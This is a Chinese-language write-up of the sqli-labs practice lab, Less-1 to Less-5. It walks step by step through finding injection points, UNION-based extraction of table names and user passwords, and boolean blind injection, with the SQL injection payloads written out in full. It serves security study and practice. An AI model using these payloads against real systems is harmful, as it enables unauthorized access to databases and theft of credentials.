# sqli-labs

打开网页，似乎有很多的题目，从第一题开始

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/K)GB)Y$K0]X7S9AW)_AVDY3.png?raw=true">

## Page-1

### Less-1

打开网页，什么都没有，屏幕中间提示我们输入id作为参数

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/N716C{K$9HYE_]S[R$(0(4Q.png?raw=true">

在url栏添加 `?id=1` ，页面变化

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/M]2XK[PCACJ[P~Q9}A2M$$0.png?raw=true">

下面判断注入点，输入 `?id=1 and 1=1` 成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/Q9B(F@X0J}BKG0TNMW86(HN.png?raw=true">

输入 `?id=1 and 1=2` 成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/YXK98G(2@54IV80[LNOV7`C.png?raw=true">

输入 `?id=1'` 报错

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/E89DYY@949HQLD%4$NY[1NX.png?raw=true">

输入 `?id=1' %23` 成功，确定存在注入点，字符型注入，单引号闭合

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/0UK$8ZD7AI~U2L7EJTT`@LW.png?raw=true">

*注：%23实际上是#的url编码*

然后判断字段数，屏幕上显示两个字段，我们从2个字段开始尝试，成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/L$ZD4__NZTM4I$AJ1D@PLNQ.png?raw=true">

3个字段成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/[2AL2(S$XP6X1FT}03`CK]I.png?raw=true">

4个字段报错

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/{X_H{439@%T_QZP7XFF{D}A.png?raw=true">

然后开始判断回显点

```sql
?id=0' union select 1,2,3 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/B95A8QVSA0N@Q7M%7{495~7.png?raw=true">

确定回显点为2,3，获取数据库名

```sql
?id=0' union select 1,version(),database() %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/H9W_GS}_22[SWJN5R23{(WU.png?raw=true">

获取到数据库名为Security，查看该数据库下所有表名

```sql
?id=0' union select 1,version(),group_concat(table_name) from information_schema.tables where table_schema=database() %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/6ZC4H5_J_@R8@[F$P7A3~1N.png?raw=true">

注意到存在一个表名为users，查看其字段名

```sql
?id=0' union select 1,version(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/@4D)`]ZX3]L$8UBQ2O%WMAX.png?raw=true">

发现敏感词汇 `username` 和 `password` ，获取其中的值，中间用id隔开

```sql
?id=0' union select 1,version(),group_concat(username,id,password) from security.users %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/H90A2JO{XJOXV6ONEHAK~_1.png?raw=true">

获取到管理员账号密码，注入成功

### Less-2

封面和Less-1一样，先开始判断注入点，输入 `?id=1 and 1=1` ，成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/`5$2$@SA}Y8N1SDBUIWPCL0.png?raw=true">

输入 `?id=1 and 1=2` 无结果

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/7PMI5L94B44DS0F)073A78T.png?raw=true">

输入 `?id=1'` 报错

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/ADPA9(ET3R5O@U2FQM3{{U9.png?raw=true">

输入 `?id=1' %23` 报错，确定存在注入点，数字型注入

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/VEJ~XGGIZ_B{W)X)8PJ8}1P.png?raw=true">

下面过程和Less-1一样，省略

*注：此题注入语句为 `?id=0 <SQL Injection Statement>`* 

### Less-3

开始判断注入点，下面直接公布结论

- `?id=1 and 1=1` 成功

- `?id=1 and 1=2` 成功

- `?id=1'` 报错

- `?id=1' %23` 报错

这时仔细观察输入 `?id=1'` 时的报错信息，与Less-1相比，多了一个括号

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/DZ%DWK0PIHH}MP]N)8_FKK9.png?raw=true">

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/CWIE@{I)CMFD(6LH]SLJMU0.png?raw=true">

因此在构建语句的时候，也需要把括号考虑在内，输入 `?id=1') %23` 成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/[DZI}XV{9$~WU[A(2]025BX.png?raw=true">

下面过程和Less-1一样，省略

*注：此题注入语句为 `?id=0') <SQL Injection Statement> %23`* 

### Less-4

使用 `1 and 1=1` ， `1 and 1=2` ， `1'` 均无报错，考虑可能是双引号闭合，使用双引号进行尝试

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/2QWU%BT[VUC0O4UQ$]}06N8.png?raw=true">

根据报错信息，双引号后还有个括号，因此尝试 `1") %23`

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/L]BFGW[I55E[L1Z7BDN16M3.png?raw=true">

查询成功，以下过程省略

*注：此题注入语句为 `?id=0") <SQL Injection Statement> %23`* 

### Less-5

根据报错信息，可以确定本题为字符型注入

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/95N3IWZGFV{@_4O3AW3WYSW.png?raw=true">

但是，填入 `?id=1' %23` 后，页面不存在回显点

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/DVMQ80(63AOWW1%26PL{2GS.png?raw=true">

进行布尔盲注，先判断数据库名长度，使用二分法

```sql
?id=1' and length((select database()))>9 %23
```

*注：length()函数是获取返回值的长度*

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/B(_@MYR%KE_%EUG444KF701.png?raw=true">

无返回结果，数据库名长度小于等于9

```sql
?id=1' and length((select database()))>4 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/_V{}_IM[{}6X(J~C_%U8QNW.png?raw=true">

有返回结果，现在使用等于一个一个尝试，过程省略，直接公布结果

```sql
?id=1' and length((select database()))=8 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/GL~C(4~_}1QA~0`2MZ50W]W.png?raw=true">

确定数据库名长度为8，现在开始判断数据库名，下面的语句是判断第一个字母是否为大写A

```sql
?id=1' and ascii(substr((select database()),1,1))=65 %23
```

*注：ascii()函数将参数转换为ascii码，substr(arg1, arg2, arg3)是截取函数，返回值是一个字符串，arg1为截取内容，arg2是相对截取位置，从1开始，arg3是截取长度*

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/}TGW0Y$BI58G{F(]}SYX$J0.png?raw=true">

无返回结果，说明第一个字母不是大写A，然后继续判断大写B，以下过程省略

```sql
?id=1' and ascii(substr((select database()),1,1))=115 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/X2VBV)}L_MHMCV3S}]O[KUQ.png?raw=true">

当判断到115的时候出现返回结果，确定数据库名第一个字母为小写s，然后开始判断第二个字母，以下过程省略

*注：判断字母同样可以使用二分法*

现在已知数据库名为security，开始判断所有表名长度

```sql
?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>10 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/LZDDYKG)A]6E${JVJ`7U3TM.png?raw=true">

出现返回结果，所有表名长度大于10